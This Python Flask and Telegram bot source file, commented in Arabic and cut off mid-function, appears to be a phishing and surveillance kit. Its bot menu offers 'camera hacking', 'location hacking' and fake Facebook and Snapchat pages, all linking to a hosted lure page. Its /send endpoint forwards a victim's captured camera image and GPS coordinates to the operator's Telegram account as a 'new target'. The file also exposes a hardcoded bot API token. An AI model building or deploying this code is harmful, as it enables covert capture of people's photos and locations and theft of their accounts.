import os
import telebot
from flask import Flask, render_template, request, jsonify
import threading
import base64

app = Flask(__name__)

# --- [ الإعدادات الخاصة بك ] ---
API_TOKEN = '8281242369:AAEf0c8gx9bhpbHqbXO5a0He-HlvTx_7Kp8'
ADMIN_ID = '8276213504'
MY_URL = 'https://my-bot-sniper-1-2.onrender.com/insta'
bot = telebot.TeleBot(API_TOKEN)

# --- [ لوحة تحكم القناص الاحترافية ] ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    # تعريف كافة الأزرار المطلوبة
    buttons = [
        telebot.types.InlineKeyboardButton("📸 اختراق كاميرا", url=MY_URL),
        telebot.types.InlineKeyboardButton("📍 اختراق الموقع", url=MY_URL),
        telebot.types.InlineKeyboardButton("📘 اندكس فيسبوك", url=MY_URL),
        telebot.types.InlineKeyboardButton("👻 اندكس سناب شات", url=MY_URL),
        telebot.types.InlineKeyboardButton("🧠 لعبة الأذكياء", url=MY_URL),
        telebot.types.InlineKeyboardButton("📞 كاشف الأرقام", url=MY_URL),
        telebot.types.InlineKeyboardButton("🛠️ تواصل مع المطور", url="https://t.me/MQtry1")
    ]
    
    markup.add(*buttons)
    bot.send_message(message.chat.id, "🎯 **نظام القناص المطور جاهز**\n\nاختر الأداة للإرسال:", reply_markup=markup, parse_mode='Markdown')

# --- [ مسارات Flask ] ---
@app.route('/')
@app.route('/insta')
def index():
    return render_template('index.html')

@app.route('/send', methods=['POST'])
def receive_data():
    try:
        data = request.json
        img_data = data.get('image')
        lat, lon = data.get('lat'), data.get('lon')

        # إرسال الموقع فوراً
        bot.send_message(ADMIN_ID, f"📍 **هدف جديد!**\nالرابط: http://maps.google.com/maps?q={lat},{lon}")

        # معالجة الصورة
        if img_data:
            img_bytes = base64.b64decode(img_data.split(',')[1])
